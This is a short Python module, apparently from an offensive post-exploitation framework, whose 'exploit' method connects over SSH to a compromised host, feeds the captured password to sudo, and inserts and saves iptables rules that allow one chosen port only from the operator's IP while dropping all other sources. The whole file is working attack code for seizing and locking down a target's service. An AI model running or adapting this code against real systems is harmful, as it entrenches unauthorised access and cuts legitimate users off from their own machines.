from module import *

class Whitelist(Module):

    def __init__(self, target, port, core):
	self.core = core
	self.target = target
	self.name = "Whitelist"
	self.port = port
	self.options = {
		"ip": Option("ip", self.core.localIP, "IP to whitelist", True)
		}
	
    def exploit(self, port):
	print port
	self.target.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S iptables -I INPUT -p tcp -m tcp -s " + str(self.get_value("ip")) + " --dport " + str(port) + " -j ACCEPT")
	self.target.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S iptables -I INPUT -p tcp -m tcp -s 0.0.0.0/0 --dport " + str(port) + " -j DROP")
	self.target.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S iptables-save")
	print(GOOD + self.name + " module success")
